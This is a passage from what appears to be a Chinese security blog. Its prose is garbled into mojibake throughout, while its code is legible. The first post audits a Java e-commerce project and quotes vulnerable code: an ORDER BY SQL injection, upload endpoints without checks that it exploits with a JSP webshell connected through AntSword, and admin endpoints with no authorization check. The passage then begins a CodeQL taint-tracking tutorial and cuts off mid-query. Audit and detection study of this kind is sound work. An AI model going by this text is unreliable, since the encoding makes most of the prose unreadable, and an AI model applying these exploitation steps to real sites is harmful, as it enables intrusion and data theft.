MIN(productOrder_pay_date) AS productOrder_pay_date, count(productOrder_id) as productOrder_count, productOrder_status FROM productOrder where productOrder_pay_date BETWEEN #beginDate AND #endDate /where GROUP BY DATE_FORMAT(productOrder_pay_date,%Y-%m-%d), productOrder_status/select è¿™ä¹ˆæ”¹äº†ä¹‹åæ˜¯å¯ä»¥è¿›å…¥ç®¡ç†åå°äº†ï¼Œä½†ä»£ä»·å°±æ˜¯è¿‘7å¤©è¦æ˜¯æœ‰è´­ä¹°æ•°æ®çš„è¯åå°å°±ç›´æ¥å´©æ‰äº†ã€‚ã€‚ã€‚ï¼ˆå¹¸å¥½æˆ‘ä»¬åªæ˜¯æ‹¿æ¥æµ‹è¯•ï¼Œå¯ä»¥ç›´æ¥åœ¨æ•°æ®åº“åˆ å®Œæ•°æ®åå†è¿›å…¥åå°å°±å¯ä»¥äº†ï¼Œä¸çŸ¥é“å¸ˆå‚…ä»¬æœ‰æ²¡æœ‰æ›´å¥½çš„è§£å†³æ–¹æ¡ˆ å®¡è®¡ç”±äºè¯¥é¡¹ç›®çš„ä»£ç ä½“é‡ä¸å¤šï¼Œè¿™æ¬¡æˆ‘åŸºæœ¬æ˜¯ç›´æ¥çœ‹ç€æºç æŸ¥æ¼æ´çš„ sqlæ³¨å…¥æ˜¯mybatisæ•°æ®åº“ï¼Œå…¨å±€æœç´¢å…³é”®è¯${ || + è¿™é‡Œé€‰çš„æ˜¯ProductMapper.xmlä¸­çš„ä¸€ä¸ªæœç´¢è¯­å¥ï¼Œä½äº ORDER BYå…³é”®å­—åé¢ ç„¶åæˆ‘ä»¬ä¸€è·¯å‘ä¸ŠæŸ¥æ‰¾ç”¨æ³•ï¼Œèµ°åˆ°ProductServiceImpl.javaçš„getListæ–¹æ³•å¤„ï¼Œç»§ç»­æŸ¥æ‰¾ç”¨æ³•ï¼Œè¿™æ¬¡è¦æ³¨æ„çš„æ˜¯æŸ¥æ‰¾åˆ°çš„è¦æ˜¯æˆ‘ä»¬å¯ä»¥æ§çš„orderUtilå‚æ•°çš„ç›¸å…³æ–¹æ³•ï¼Œè€Œä¸æ˜¯å·²ç»é»˜è®¤ä¸ºnullçš„ å†åŠ ä¸Šæœ‰å‰å°å’Œåå°ä¹‹åˆ†ï¼Œæˆ‘ä»¬å°½é‡æ‰¾å‰å°ï¼Œè€Œä¸æ˜¯éœ€è¦ç®¡ç†å‘˜æƒé™çš„åå°ç›¸å…³ä»£ç  èµ°åˆ°äº†ForeProductListController.javaçš„searchProductæ–¹æ³•ä¸­ @RequestMapping(value = product/index/count, method = RequestMethod.GET)public String searchProduct(HttpSession session, MapString, Object map, @PathVariable(index) Integer index/* é¡µæ•° */, @PathVariable(count) Integer count/* è¡Œæ•°*/, @RequestParam(value = category_id, required = false) Integer category_id/* åˆ†ç±»ID */, @RequestParam(value = product_name, required = false) String product_name/* äº§å“åç§° */, @RequestParam(required = false) String orderBy/* æ’åºå­—æ®µ */, @RequestParam(required = false, defaultValue = true) Boolean isDesc/* æ˜¯å¦å€’åº */) throws UnsupportedEncodingException é™¤äº†indexå’Œcountå‚æ•°æ˜¯å¿…éœ€å¤–ï¼Œå‰©ä¸‹çš„å‚æ•°éƒ½æ˜¯å¯åŠ å¯ä¸åŠ çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡Œæµ‹è¯• è¿™é‡Œç”¨çš„æ˜¯æ—¶é—´ç›²æµ‹çš„æ‰‹æ³• è¯¥ç¯‡å°±åªè®²è¿™ä¸€å¤„çš„sqlæ¼æ´ï¼Œå‰©ä¸‹å‡ å¤„å°±ä¸å¤šè®²äº† å‰å°æ–‡ä»¶ä¸Šä¼ å…¨å±€æœç´¢å…³é”®è¯ï¼šupload || ä¸Šä¼  || write || new File è¿™é‡Œæ‰¾åˆ°å‰å°çš„ForeUserController.javaçš„uploadUserHeadImageæ–¹æ³• @RequestMapping(value = user/uploadUserHeadImage, method = RequestMethod.POST, produces = application/json;charset=utf-8)public String uploadUserHeadImage(@RequestParam MultipartFile file, HttpSession session) String originalFileName = file.getOriginalFilename(); logger.info(è·å–å›¾ç‰‡åŸå§‹æ–‡ä»¶åï¼š, originalFileName); String extension = originalFileName.substring(originalFileName.lastIndexOf(.)); String fileName = UUID.randomUUID() + extension; String filePath = session.getServletContext().getRealPath(/) + res/images/item/userProfilePicture/ + fileName; logger.info(æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼š, filePath); JSONObject jsonObject = new JSONObject(); try logger.info(æ–‡ä»¶ä¸Šä¼ ä¸­...); file.transferTo(new File(filePath)); logger.info(æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼); jsonObject.put(success, true); jsonObject.put(fileName, fileName); catch (IOException e) logger.warn(æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼); e.printStackTrace(); jsonObject.put(success, false); return jsonObject.toJSONString(); å¯ä»¥å‘ç°å¯¹ä¸Šä¼ ä¸Šæ¥çš„æ–‡ä»¶æ²¡æœ‰åšä»»ä½•çš„æ ¡éªŒï¼Œå†åŠ ä¸Šè¯¥é¡¹ç›®ä¸­æ˜¯å¯ä»¥è§£æjspæ–‡ä»¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ Jspé©¬ å‰ç«¯åšäº†ä¸€å®šçš„æ ¡éªŒï¼Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡ //å›¾ç‰‡ä¸Šä¼ function uploadImage(fileDom) //è·å–æ–‡ä»¶ var file = fileDom.files[0]; //åˆ¤æ–­ç±»å‹ var imageType = /^image\\//; if (file === undefined || !imageType.test(file.type)) alert(è¯·é€‰æ‹©å›¾ç‰‡ï¼); return; //åˆ¤æ–­å¤§å° if (file.size 512000) alert(å›¾ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡500Kï¼); return; //æ¸…ç©ºå€¼ $(fileDom).val(); var formData = new FormData(); formData.append(file, file); //ä¸Šä¼ å›¾ç‰‡ $.ajax( url: /tmall/user/uploadUserHeadImage, type: post, data: formData, contentType: false, processData: false, dataType: json, mimeType: multipart/form-data, success: function (data) if (data.success) $(fileDom).prev(img).attr(src,/tmall/res/images/item/userProfilePicture/+data.fileName); $(#user_profile_picture_src_value).val(data.fileName); else alert(å›¾ç‰‡ä¸Šä¼ å¼‚å¸¸ï¼); , beforeSend: function () , error: function () ); é€šè¿‡bpæŠ“åŒ…å³å¯ç»•è¿‡ ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿›è¡Œè¿æ¥æµ‹è¯• åå°æ–‡ä»¶ä¸Šä¼ è¯¥æ¼æ´éœ€è¦ç®¡ç†å‘˜æƒé™æ‰å¯ä»¥æˆåŠŸåˆ©ç”¨ é¦–å…ˆæ˜¯ProductController.javaçš„uploadProductImageæ–¹æ³• @ResponseBody@RequestMapping(value = admin/uploadProductImage, method = RequestMethod.POST, produces = application/json;charset=utf-8)public String uploadProductImage(@RequestParam MultipartFile file, @RequestParam String imageType, HttpSession session) String originalFileName = file.getOriginalFilename(); logger.info(è·å–å›¾ç‰‡åŸå§‹æ–‡ä»¶åï¼š, originalFileName); String extension = originalFileName.substring(originalFileName.lastIndexOf(.)); String filePath; String fileName = UUID.randomUUID() + extension; if (single.equals(imageType)) filePath = session.getServletContext().getRealPath(/) + res/images/item/productSinglePicture/ + fileName; else filePath = session.getServletContext().getRealPath(/) + res/images/item/productDetailsPicture/ + fileName; logger.info(æ–‡ä»¶ä¸Šä¼ è·¯å¾„ï¼š, filePath); JSONObject object = new JSONObject(); try logger.info(æ–‡ä»¶ä¸Šä¼ ä¸­...); file.transferTo(new File(filePath)); logger.info(æ–‡ä»¶ä¸Šä¼ å®Œæˆ); object.put(success, true); object.put(fileName, fileName); catch (IOException e) logger.warn(æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼); e.printStackTrace(); object.put(success, false); return object.toJSONString(); ä¸€æ ·ä¹Ÿæ˜¯æ²¡æœ‰è¿›è¡Œä»»ä½•çš„æ ¡éªŒï¼ŒæŸ¥çœ‹äº†å‰ç«¯ä»£ç åªæœ‰å‰ç«¯åšäº†é™åˆ¶åªå…è®¸ä¸Šä¼ å›¾ç‰‡ è·Ÿå‰å°æ–‡ä»¶ä¸Šä¼ ä¸€æ ·çš„æ‰‹æ³•å°±å¯ä»¥äº† ç”¨èšå‰‘æˆåŠŸè¿ä¸Š é™¤äº†è¯¥å¤„æ¼æ´å¤–åå°è¿˜æœ‰å…¶ä»–å‡ å¤„æ–‡ä»¶ä¸Šä¼ æ¼æ´ srcmainjavacomxqtmallcontrolleradminCategoryController.javaçš„uploadCategoryImageæ–¹æ³• srcmainjavacomxqtmallcontrolleradminAccountController.javaçš„uploadAdminHeadImageæ–¹æ³• è¶Šæƒä¿—è¯è¯´çš„å¥½ï¼Œå¥½é¥­ä¸æ€•æ™šï¼Œè¶Šæƒçš„æ´å½“ç„¶æ˜¯å‹è½´çš„äº† è¿™é‡Œç”¨çš„æ˜¯å…¶ä»–ç±»ç»§æ‰¿ä¸€ä¸ªåŸºç¡€ç±»BaseControlleræ¥å®ç°é‰´æƒ package com.xq.tmall.controller;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;import javax.servlet.http.HttpSession;/** * åŸºæ§åˆ¶å™¨ */public class BaseController //log4j protected Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME); //æ£€æŸ¥ç®¡ç†å‘˜æƒé™ protected Object checkAdmin(HttpSession session) Object o = session.getAttribute(adminId); if(o==null) logger.info(æ— ç®¡ç†æƒé™ï¼Œè¿”å›ç®¡ç†å‘˜ç™»é™†é¡µ); return null; logger.info(æƒé™éªŒè¯æˆåŠŸï¼Œç®¡ç†å‘˜IDï¼š,o); return o; //æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½• protected Object checkUser(HttpSession session) Object o = session.getAttribute(userId); if(o==null) logger.info(ç”¨æˆ·æœªç™»å½•); return null; logger.info(ç”¨æˆ·å·²ç™»å½•ï¼Œç”¨æˆ·IDï¼š, o); return o; ä»ä»£ç é‡Œé¢å¯ä»¥å‘ç°æ˜¯æ²¡æœ‰ä»»ä½•çš„é€»è¾‘æ¼æ´ç­‰ç­‰çš„ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦ç”¨å¥½checkAdminå’ŒcheckUserè¿™ä¸¤ä¸ªæ–¹æ³•é‚£ä¹ˆå°±å®Œå…¨ç»•è¿‡ä¸äº†äº† ä½†æ˜¯æœ‰æ—¶å€™ä»£ç æ— é”™ä¸ä»£è¡¨ä¸€å®šå®‰å…¨ï¼Œå› ä¸ºå¼€å‘äººå‘˜ä¹Ÿä¼šå‡ºç°é”™è¯¯ è¿™é‡Œæˆ‘ç¿»ä»£ç çš„æ—¶å€™æ‰¾åˆ°äº†ProductController.javaçš„deleteProductImageByIdæ–¹æ³• @ResponseBody@RequestMapping(value = admin/productImage/productImage_id,method = RequestMethod.DELETE,produces = application/json;charset=utf-8)public String deleteProductImageById(@PathVariable Integer productImage_id/* äº§å“å›¾ç‰‡ID */) JSONObject object = new JSONObject(); logger.info(è·å–productImage_idä¸ºçš„äº§å“å›¾ç‰‡ä¿¡æ¯,productImage_id); ProductImage productImage = productImageService.get(productImage_id); logger.info(åˆ é™¤äº§å“å›¾ç‰‡); Boolean yn = productImageService.deleteList(new Integer[]productImage_id); if (yn) logger.info(åˆ é™¤å›¾ç‰‡æˆåŠŸï¼); object.put(success, true); else logger.warn(åˆ é™¤å›¾ç‰‡å¤±è´¥ï¼äº‹åŠ¡å›æ»š); object.put(success, false); throw new RuntimeException(); return object.toJSONString(); è¯¥ç±»ä¸­å°±è¿™ä¹ˆä¸€ä¸ªæ–¹æ³•æ²¡æœ‰ç”¨ä¸ŠcheckAdminæ–¹æ³•ï¼Œäºæ˜¯æˆ‘ä»¬å°±å®ç°äº†å‚ç›´è¶Šæƒæ“ä½œ å»åå°æŸ¥çœ‹å‘ç°ç¡®å®æ˜¯å°‘äº†ä¸€å¼ å›¾ç‰‡äº† åœ¨å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™æˆ‘çœ‹äº†çœ‹è¿™ä¸ªæ–¹æ³•çš„ä»£ç ï¼Œå‘ç°å®ƒæ‰€éœ€çš„å‚æ•°ä¸­å¹¶æ²¡æœ‰sessionæˆ–è€…æ˜¯cookieï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯ä»£è¡¨æˆ‘ä»¬å¯ä»¥å®ç°æœªç™»å½•çš„æƒ…å†µä¸‹ä»»æ„åˆ é™¤å›¾ç‰‡ï¼Œè¿›è¡Œæµ‹è¯• ç¡®å®å¦‚æ­¤ï¼Œæ„å¤–ä¹‹å–œå‘ è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•æ˜¯CategoryController.javaçš„updateCategoryæ–¹æ³• @ResponseBody@RequestMapping(value = admin/category/category_id, method = RequestMethod.PUT, produces = application/json;charset=utf-8)public String updateCategory(@RequestParam String category_name/* åˆ†ç±»åç§° */, @RequestParam String category_image_src/* åˆ†ç±»å›¾ç‰‡è·¯å¾„ */, @PathVariable(category_id) Integer category_id/* åˆ†ç±»ID */) JSONObject jsonObject = new JSONObject(); logger.info(æ•´åˆåˆ†ç±»ä¿¡æ¯); Category category = new Category() .setCategory_id(category_id) .setCategory_name(category_name) .setCategory_image_src(category_image_src.substring(category_image_src.lastIndexOf(/) + 1)); logger.info(æ›´æ–°åˆ†ç±»ä¿¡æ¯ï¼Œåˆ†ç±»IDå€¼ä¸ºï¼š, category_id); boolean yn = categoryService.update(category); if (yn) logger.info(æ›´æ–°æˆåŠŸï¼); jsonObject.put(success, true); jsonObject.put(category_id, category_id); else jsonObject.put(success, false); logger.info(æ›´æ–°å¤±è´¥ï¼äº‹åŠ¡å›æ»š); throw new RuntimeException(); return jsonObject.toJSONString(); è¯¥æ–¹æ³•åŒæ ·æ˜¯æ²¡æœ‰è¿›è¡Œé‰´æƒçš„æ“ä½œ ä¸Šè¿°çš„ä¸¤ä¸ªæ–¹æ³•è™½ç„¶è¯´éƒ½å¯ä»¥å®ç°å‚ç›´è¶Šæƒï¼Œä½†æ˜¯åœ¨çœŸå®ç¯å¢ƒä¸­å¯ä»¥è¯´æ˜¯å±å®³ä¸å¤§ï¼Œç›´åˆ°æˆ‘å‘ç°äº†ä¸‹é¢è¿™ä¸ª ä½äºUserController.javaçš„getUserBySearchæ–¹æ³• @ResponseBody @RequestMapping(value = admin/user/index/count, method = RequestMethod.GET, produces = application/json;charset=UTF-8) public String getUserBySearch(@RequestParam(required = false) String user_name/* ç”¨æˆ·åç§° */, @RequestParam(required = false) Byte[] user_gender_array/* ç”¨æˆ·æ€§åˆ«æ•°ç»„ */, @RequestParam(required = false) String orderBy/* æ’åºå­—æ®µ */, @RequestParam(required = false, defaultValue = true) Boolean isDesc/* æ˜¯å¦å€’åº */, @PathVariable Integer index/* é¡µæ•° */, @PathVariable Integer count/* è¡Œæ•° */) throws UnsupportedEncodingException //ç§»é™¤ä¸å¿…è¦æ¡ä»¶ Byte gender = null; if (user_gender_array != null user_gender_array.length == 1) gender = user_gender_array[0]; if (user_name != null) //å¦‚æœä¸ºéç©ºå­—ç¬¦ä¸²åˆ™è§£å†³ä¸­æ–‡ä¹±ç ï¼šURLDecoder.decode(String,UTF-8); user_name = .equals(user_name) ? null : URLDecoder.decode(user_name, UTF-8); if (orderBy != null .equals(orderBy)) orderBy = null; .......... å¯ä»¥å‘ç°è¯¥æ–¹æ³•æ²¡æœ‰ç”¨åˆ°checkAdminæ–¹æ³•è¿›è¡Œé‰´æƒï¼Œç›´æ¥æµ‹è¯•å‚ç›´è¶Šæƒ è·å–å‰åä¸ªç®¡ç†å‘˜çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå®ç°äº†ä»»æ„ç®¡ç†å‘˜è´¦æˆ·æ¥ç®¡ æˆ‘ä»¬ä¹Ÿå¯ä»¥åŠ ä¸Šæ¡ä»¶æ¥æŸ¥è¯¢ä¸€ä¸ªç‰¹å®šç®¡ç†å‘˜çš„ä¿¡æ¯ ç»“è¯­è¯¥é¡¹ç›®å®¡è®¡èµ·æ¥éš¾åº¦ä¸å¤§ï¼Œå°±æ˜¯è‡ªå·±æµ‹è¯•çš„æ—¶å€™ç¯å¢ƒæ­å»ºéº»çƒ¦äº†ç‚¹ã€‚ã€‚ã€‚ã€‚ è¿˜æœ‰å…¶ä»–æ€è·¯çš„æ¬¢è¿å¸ˆå‚…ä¸æˆ‘è¿›è¡Œäº¤æµ","categories":["ä»£ç å®¡è®¡"]},{"title":"CodeQl å…¥é—¨","path":"/2025/08/23/CodeQl-å…¥é—¨/","content":"å‚è€ƒCodeQLå…¥é—¨ CodeQLå…¥åŸç¯‡ New dataflow API for writing custom CodeQL queries CodeQLè¸©å‘æ—¥è®°andè§„åˆ™åˆ†äº« å‰è¨€ä¸‹é¢ä¸ºç¬”è€…åˆå­¦codeqlæ‰€è®°çš„ç¬”è®°ï¼Œæ¶‰åŠåˆ°çš„æ‰€æœ‰qlä»£ç éƒ½æ˜¯ç”¨äºæŸ¥è¯¢é¶åœºä¸­å¯¹åº”æ¼æ´çš„ CodeQL åŸºæœ¬è¯­æ³•QL è¯­æ³•ç”¨çš„æ˜¯è¿™ä¸ªé¶åœº â€”â€” micro_service_seclab:ï¼ŒåŒç†å…¶å® JoyChou93 å¸ˆå‚…ä¹‹å‰æ‰€è®¾è®¡çš„é¶åœºï¼Œä¹Ÿæ˜¯å¯ä»¥ç”¨æ¥åš CodeQL ç»ƒä¹ çš„ã€‚ æ·»åŠ å¯¹åº” database codeql database create E:\\mycode\\codeql\\CodeQL-Practice --language=java --source-root=E:\\safety\\CodeAudit\\micro_service_seclab-main --command=mvn clean package -Dmaven.test.skip=true --command=mvn clean package -Dmaven.test.skip=trueå‘Šè¯‰ CodeQL å¦‚ä½•ç¼–è¯‘æºç  mvn clean packageï¼šç”¨ Maven æ¸…ç†å¹¶æ‰“åŒ…é¡¹ç›®ã€‚ -Dmaven.test.skip=trueï¼šè·³è¿‡æµ‹è¯•ä»£ç çš„ç¼–è¯‘å’Œæ‰§è¡Œï¼ˆèŠ‚çœæ—¶é—´ï¼Œé¿å…æµ‹è¯•å¤±è´¥é˜»ç¢ï¼‰ã€‚ CodeQL åœ¨æ„å»ºæ•°æ®åº“æ—¶ï¼Œéœ€è¦é¡¹ç›®èƒ½æˆåŠŸç¼–è¯‘ï¼Œè¿™æ ·å®ƒæ‰èƒ½æ•è·æ‰€æœ‰ç±»ã€æ–¹æ³•ã€è°ƒç”¨å…³ç³»ç­‰è¯­ä¹‰ä¿¡æ¯ã€‚ è¿™é‡Œå®ƒä¼šè°ƒç”¨ Maven ç¼–è¯‘è¿‡ç¨‹æ¥ç”Ÿæˆå­—èŠ‚ç å¹¶æ”¶é›†ç¼–è¯‘ä¿¡æ¯ã€‚ CodeQLçš„æ ¸å¿ƒå¼•æ“æ˜¯ä¸å¼€æºçš„ï¼Œè¿™ä¸ªæ ¸å¿ƒå¼•æ“çš„ä½œç”¨ä¹‹ä¸€æ˜¯å¸®åŠ©æˆ‘ä»¬æŠŠmicro-service-seclabè½¬æ¢æˆCodeQLèƒ½è¯†åˆ«çš„ä¸­é—´å±‚æ•°æ®åº“ã€‚ ç„¶åæˆ‘ä»¬éœ€è¦ç¼–å†™QLæŸ¥è¯¢è¯­å¥æ¥è·å–æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ã€‚ æ­£å¦‚è¿™å¼ å›¾æè¿°çš„ï¼Œç”±äºCodeQLå¼€æºäº†æ‰€æœ‰çš„è§„åˆ™å’Œè§„åˆ™åº“éƒ¨åˆ†ï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿåšçš„å°±æ˜¯ç¼–å†™ç¬¦åˆæˆ‘ä»¬ä¸šåŠ¡é€»è¾‘çš„QLè§„åˆ™ï¼Œç„¶åä½¿ç”¨CodeQLå¼•æ“å»è·‘æˆ‘ä»¬çš„è§„åˆ™ï¼Œå‘ç°é¶åœºçš„å®‰å…¨æ¼æ´ã€‚ æˆ‘ä»¬æ¥ç®€å•åœ°ä»‹ç»ä¸€ä¸‹æœ¬æ¡ˆä¾‹æ¶‰åŠåˆ°çš„CodeQLçš„åŸºæœ¬è¯­æ³•ã€‚ åŸºæœ¬è¯­æ³•åŒ…å«3ä¸ªéƒ¨åˆ†ã€‚ åç§° è§£é‡Š Method æ–¹æ³•ç±»ï¼ŒMethod method è¡¨ç¤ºè·å–å½“å‰é¡¹ç›®ä¸­æ‰€æœ‰çš„æ–¹æ³• MethodCall æ–¹æ³•è°ƒç”¨ç±»ï¼ŒMethodCall call è¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­çš„æ‰€æœ‰æ–¹æ³•è°ƒç”¨ Parameter å‚æ•°ç±»ï¼ŒParameter è¡¨ç¤ºè·å–å½“å‰é¡¹ç›®å½“ä¸­æ‰€æœ‰çš„å‚æ•° ç»“åˆ ql çš„è¯­æ³•ï¼Œæˆ‘ä»¬å°è¯•è·å– micro-service-seclab é¡¹ç›®å½“ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼š import java from Method methodselect method æˆ‘ä»¬å†é€šè¿‡ Method ç±»å†…ç½®çš„ä¸€äº›æ–¹æ³•ï¼ŒæŠŠç»“æœè¿‡æ»¤ä¸€ä¸‹ã€‚æ¯”å¦‚æˆ‘ä»¬è·å–åå­—ä¸º getStudent çš„æ–¹æ³•åç§°ã€‚ import java from Method methodwhere method.hasName(getStudent)select method.getName(), method.getDeclaringType() method.getName() // è·å–çš„æ˜¯å½“å‰æ–¹æ³•çš„åç§°method.getDeclaringType() / è·å–çš„æ˜¯å½“å‰æ–¹æ³•æ‰€å±classçš„åç§°ã€‚ è°“è¯å’ŒSQLä¸€æ ·ï¼Œwhereéƒ¨åˆ†çš„æŸ¥è¯¢æ¡ä»¶å¦‚æœè¿‡é•¿ï¼Œä¼šæ˜¾å¾—å¾ˆä¹±ã€‚CodeQLæä¾›ä¸€ç§æœºåˆ¶å¯ä»¥è®©ä½ æŠŠå¾ˆé•¿çš„æŸ¥è¯¢è¯­å¥å°è£…æˆå‡½æ•°ã€‚ è¿™ä¸ªå‡½æ•°ï¼Œå°±å«è°“è¯ã€‚ æ¯”å¦‚ä¸Šé¢çš„æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆå¦‚ä¸‹ï¼Œè·å¾—çš„ç»“æœè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼š import java predicate isStudent(Method method) exists(|method.hasName(getStudent)) from Method methodwhere isStudent(method)select method.getName(), method.getDeclaringType() è¯­æ³•è§£é‡Š predicate è¡¨ç¤ºå½“å‰æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ã€‚exists å­æŸ¥è¯¢ï¼Œæ˜¯CodeQLè°“è¯è¯­æ³•é‡Œéå¸¸å¸¸è§çš„è¯­æ³•ç»“æ„ï¼Œå®ƒæ ¹æ®å†…éƒ¨çš„å­æŸ¥è¯¢è¿”å› true or falseï¼Œæ¥å†³å®šç­›é€‰å‡ºå“ªäº›æ•°æ®ã€‚ è®¾ç½® Source å’Œ Sinkä»€ä¹ˆæ˜¯sourceå’Œsink åœ¨ä»£ç è‡ªåŠ¨åŒ–å®‰å…¨å®¡è®¡çš„ç†è®ºå½“ä¸­ï¼Œæœ‰ä¸€ä¸ªæœ€æ ¸å¿ƒçš„ä¸‰å…ƒç»„æ¦‚å¿µï¼Œå°±æ˜¯(sourceï¼Œsinkå’Œsanitizer)ã€‚ source æ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„è¾“å…¥ç‚¹ã€‚æ¯”å¦‚è·å–httpè¯·æ±‚çš„å‚æ•°éƒ¨åˆ†ï¼Œå°±æ˜¯éå¸¸æ˜æ˜¾çš„Sourceã€‚ sink æ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„æ‰§è¡Œç‚¹ï¼Œæ¯”å¦‚SQLæ³¨å…¥æ¼æ´ï¼Œæœ€ç»ˆæ‰§è¡ŒSQLè¯­å¥çš„å‡½æ•°å°±æ˜¯sink(è¿™ä¸ªå‡½æ•°å¯èƒ½å«queryæˆ–è€…exeSqlï¼Œæˆ–è€…å…¶å®ƒ)ã€‚ sanitizeråˆå«å‡€åŒ–å‡½æ•°ï¼Œæ˜¯æŒ‡åœ¨æ•´ä¸ªçš„æ¼æ´é“¾æ¡å½“ä¸­ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ–¹æ³•é˜»æ–­äº†æ•´ä¸ªä¼ é€’é“¾ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±å«sanitizerã€‚ åªæœ‰å½“sourceå’ŒsinkåŒæ—¶å­˜åœ¨ï¼Œå¹¶ä¸”ä»sourceåˆ°sinkçš„é“¾è·¯æ˜¯é€šçš„ï¼Œæ‰è¡¨ç¤ºå½“å‰æ¼æ´æ˜¯å­˜åœ¨çš„ã€‚ è®¾ç½® Source åœ¨ micro_service_seclab ä¸­ï¼Œå¯¹åº”çš„ Source ä¸¾ä¸ªä¾‹å­ï¼ŒSQL æ³¨å…¥çš„ä»£ç  @RequestMapping(value = /one) public ListStudent one(@RequestParam(value = username) String username) return indexLogic.getStudent(username); å¯¹åº” CodeQL å½“ä¸­çš„ Source override predicate isSource(DataFlow::Node src) src instanceof RemoteFlowSource RemoteFlowSource ç±»ï¼ˆåœ¨semmle.code.java.dataflow.FlowSourcesï¼‰ä¸­å®šä¹‰ï¼‰è¡¨ç¤ºå¯èƒ½ç”±è¿œç¨‹ç”¨æˆ·æ§åˆ¶çš„æ•°æ®æµæº è¿™é‡Œå°±æ˜¯è¯´ï¼šæŠŠæ‰€æœ‰è¿œç¨‹è¾“å…¥éƒ½å½“ä½œsource è¿™é‡Œè¿™æ®µä»£ç çš„ä¼ å‚æ¯”è¾ƒç®€å•ï¼Œä½†å…¶å®ä¼ å‚å¦‚æœå¤æ‚ï¼Œæ¯”å¦‚æ˜¯ä¸€ä¸ªç±»çš„æƒ…å†µä¸‹ï¼Œä¹Ÿæ˜¯ç±»ä¼¼çš„ åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œsourceå°±æ˜¯Student user(userä¸ºStudentç±»å‹ï¼Œè¿™ä¸ªä¸å—å½±å“)ã€‚ @PostMapping(value = /object)public ListStudent objectParam(@RequestBody Student user) return indexLogic.getStudent(user.getUsername()); è®¾ç½® Sink åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬çš„sinkåº”è¯¥ä¸ºqueryæ–¹æ³•(Method)çš„è°ƒç”¨(MethodAccess)ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾ç½®Sinkä¸ºï¼š override predicate isSink(DataFlow::Node sink) exists(Method method, MethodCall call | method.hasName(query) and call.getMethod() = method and sink.asExpr() = call.getArgument(0)) æ³¨ï¼šä»¥ä¸Šä»£ç ä½¿ç”¨äº†existså­æŸ¥è¯¢è¯­æ³•ï¼Œæ ¼å¼ä¸ºexists(Obj obj| somthing), ä¸Šé¢æŸ¥è¯¢çš„æ„æ€ä¸ºï¼šæŸ¥æ‰¾ä¸€ä¸ªquery()æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œå¹¶æŠŠå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºsinkã€‚ åœ¨é¶åœºç³»ç»Ÿ(micro-service-seclab)ä¸­ï¼Œsinkå°±æ˜¯ï¼š jdbcTemplate.query(sql, ROW_MAPPER); å› ä¸ºæˆ‘ä»¬æµ‹è¯•çš„æ³¨å…¥æ¼æ´ï¼Œå½“sourceå˜é‡æµå…¥è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œæ‰ä¼šå‘ç”Ÿæ³¨å…¥æ¼æ´ï¼ Flowæ•°æ®æµåœ¨è®¾ç½®å®Œ Source å’Œ Sink ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤ Source åˆ° Sink æ˜¯èƒ½å¤Ÿèµ°é€šçš„ï¼Œè¿™ä¸€æ®µçš„è¿é€šå·¥ä½œå°±æ˜¯ CodeQL å¼•æ“æœ¬èº«æ¥å®Œæˆçš„ã€‚æˆ‘ä»¬é€šè¿‡ config.hasFlowPath(source, sink) æ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦è¿é€šã€‚ æ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š module VulFlow = TaintTracking::GlobalVulConfig;from VulFlow::PathNode source, VulFlow::PathNode sinkwhere VulFlow::flowPath(source, sink)select source, sink, å‘ç°æ½œåœ¨çš„SQLæ³¨å…¥æ¼æ´ æˆ‘ä»¬ä¼ é€’ç»™ VulFlow::flowPath(source, sink) æˆ‘ä»¬å®šä¹‰å¥½çš„sourceå’Œsinkï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´äº†ã€‚ CodeQL è¯­å¥ä¼˜åŒ–åˆæ­¥æˆæœç»è¿‡æ•´ç†ä¹‹åçš„ ql æŸ¥è¯¢ä»£ç  /** @id java/examples/vuldemo * @name Sql-Injection * @description Sql-Injection * @kind path-problem * @problem.severity warning */import javaimport semmle.code.java.dataflow.DataFlowimport semmle.code.java.dataflow.TaintTrackingimport semmle.code.java.dataflow.FlowSources/** å®šä¹‰æ•°æ®æµé…ç½® */module VulConfig implements DataFlow::ConfigSig predicate isSource(DataFlow::Node src) src instanceof RemoteFlowSource predicate 